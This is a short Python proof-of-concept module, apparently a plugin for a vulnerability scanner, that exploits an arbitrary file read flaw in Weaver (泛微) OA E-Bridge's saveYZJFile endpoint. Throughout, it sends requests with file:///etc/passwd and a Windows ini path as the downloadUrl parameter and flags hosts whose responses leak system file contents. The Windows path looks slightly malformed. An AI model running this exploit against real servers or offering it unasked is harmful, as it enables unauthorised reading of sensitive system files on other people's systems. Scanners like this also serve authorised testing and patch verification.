#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = 'https://peiqi.wgpsec.org/wiki/oa/泛微OA/泛微OA E-Bridge saveYZJFile 任意文件读取漏洞.html'
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "泛微OA E-Bridge saveYZJFile 任意文件读取漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  targets = ["/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt","/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/windows.ini&fileExt=txt"]
  url1 = url + targets[0]
  url2 = url + targets[1]
  try:
    res=requests.get(url=url1,headers=headers,timeout=8,verify=False)
    if res.status_code == 200 and 'root:' in res.text:
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    if res.status_code == 200 and 'for 16-bit app support' in res.text:
      ret['url'] = url1
      ret['ifbug'] = True
      res.close()
      return ret
  except:
    pass
  try:
    resp=requests.get(url=url2,headers=headers,timeout=8,verify=False)
    if resp.status_code == 200 and 'root:' in resp.text:
      ret['url'] = url2
      ret['ifbug'] = True
      resp.close()
      return ret
    if resp.status_code == 200 and 'for 16-bit app support' in resp.text:
      ret['url'] = url2
      ret['ifbug'] = True
      resp.close()
      return ret
    else:
      return ret
  except:
    return ret 